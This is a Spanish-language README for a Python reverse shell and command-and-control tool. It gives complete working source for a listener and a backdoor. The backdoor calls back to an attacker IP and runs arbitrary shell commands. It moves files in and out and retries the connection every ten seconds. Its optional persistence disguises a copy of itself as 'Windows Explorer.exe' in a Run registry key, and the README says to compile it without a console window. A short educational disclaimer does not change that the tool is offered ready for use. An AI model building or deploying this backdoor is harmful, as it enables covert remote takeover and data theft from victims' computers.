# README.md — Simple TCP Reverse Shell (C2 Framework)

Este proyecto es un ejemplo de comunicación C2 (Command & Control) utilizando Sockets en Python. Permite la ejecución remota de comandos, navegación por directorios y transferencia de archivos entre una máquina atacante y una víctima de prueba.

## 🚀 Características
- **Conexión Inversa:** Evade la mayoría de las restricciones de firewall entrantes.
- **Transferencia de Archivos:** Subida y descarga de archivos mediante Base64.
- **Persistencia:** Capacidad de auto-copia y registro en el `Startup` de Windows.
- **Reconexión Automática:** El agente intenta reconectar cada 10s si se pierde el enlace.
- **Comunicación Confiable:** Uso de JSON para manejar búferes de datos grandes.

## 🛠️ Instalación y Requisitos

### 1. Preparar el entorno (Atacante)
Se recomienda el uso de **Kali Linux** o cualquier entorno con Python 3.
```bash
git clone https://github.com
cd tu-repositorio
```

### 2. Configuración
Edita los archivos `listener.py` y `backdoor.py` para incluir tu dirección IP:
```python
# Cambia esto por tu IP local o pública
agente = AgentePro("192.168.1.X", 4444)
```

### 3. Compilación (Víctima)
Para convertir el script de Python en un ejecutable de Windows que no muestre la consola:
```bash
pip install pyinstaller
pyinstaller --noconsole --onefile backdoor.py
```
*El archivo generado estará en la carpeta `/dist`.*

## 💻 Guía de Uso

1. **Iniciar el Escucha:**
   En tu terminal, ejecuta el servidor para esperar la conexión:
   ```bash
   python3 listener.py
   ```

2. **Ejecutar el Agente:**
   Lanza el ejecutable `backdoor.exe` en la máquina de prueba.

3. **Comandos Disponibles:**
   - `cd <ruta>`: Cambiar de directorio en la máquina remota.
   - `descargar <archivo>`: Traer un archivo de la víctima a tu máquina.
   - `subir <archivo>`: Enviar un archivo local a la víctima.
   - `salir`: Cerrar la sesión y terminar el proceso remoto.
   - `Cualquier comando de sistema`: (ej. `dir`, `ipconfig`, `whoami`).

## ⚠️ Descargo de Responsabilidad
Este software ha sido creado exclusivamente con fines **educativos y de auditoría ética**. El uso de esta herramienta contra objetivos sin consentimiento previo por escrito es ilegal. El desarrollador no se hace responsable del mal uso de este código.

---

## 📦 Código Completo

### 1. El Listener (Servidor) — `listener.py`
```python
import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Esperando conexiones...")
        self.connection, address = listener.accept()
        print("[+] Conexión establecida desde " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Descarga finalizada con éxito."

    def leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def ejecutar_remoto(self, command):
        self.reliable_send(command)
        if command[0] == "salir":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            command = command.split(" ")
            
            try:
                if command[0] == "subir":
                    content = self.leer_archivo(command[1])
                    command.append(content)

                result = self.ejecutar_remoto(command)

                if command[0] == "descargar" and "[-] Error" not in result:
                    result = self.escribir_archivo(command[1], result)
            except Exception as e:
                result = "[-] Error durante la operación: " + str(e)

            print(result)

# Ejecución: Listener("TU_IP", PUERTO)
escucha = Listener("0.0.0.0", 4444)
escucha.run()
```

### 2. El Backdoor (Cliente) — `backdoor.py`
```python
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time

class Backdoor:
    def __init__(self, ip, port):
        # self.become_persistent() # Descomentar para activar persistencia
        self.ip = ip
        self.port = port
        self.conectar()

    def become_persistent(self):
        file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v update /t REG_SZ /d "' + file_location + '" /f', shell=True)

    def conectar(self):
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.ip, self.port))
                self.run()
            except Exception:
                time.sleep(10) # Reintento de conexión

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def ejecutar_comando(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)

    def leer_archivo(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def escribir_archivo(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Archivo subido correctamente."

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "salir":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(command[1])
                    result = "[+] Directorio: " + os.getcwd()
                elif command[0] == "descargar":
                    result = self.leer_archivo(command[1])
                elif command[0] == "subir":
                    result = self.escribir_archivo(command[1], command[2])
                else:
                    result = self.ejecutar_comando(command).decode()
            except Exception as e:
                result = "[-] Error: " + str(e)

            self.reliable_send(result)

# Cambia la IP por la de tu servidor
puerta = Backdoor("192.168.1.9", 4444)
```

---

## 🔧 Instrucciones Finales

1. **Prueba local:** Ejecuta primero `listener.py` y luego `backdoor.py`.
2. **Compilación:** Si quieres usarlo en Windows sin Python, usa:
   ```bash
   pyinstaller --noconsole --onefile backdoor.py
   ```
3. **Uso:** Una vez conectado, usa comandos normales o `descargar nombre_archivo.png` y `subir mi_script.bat`.
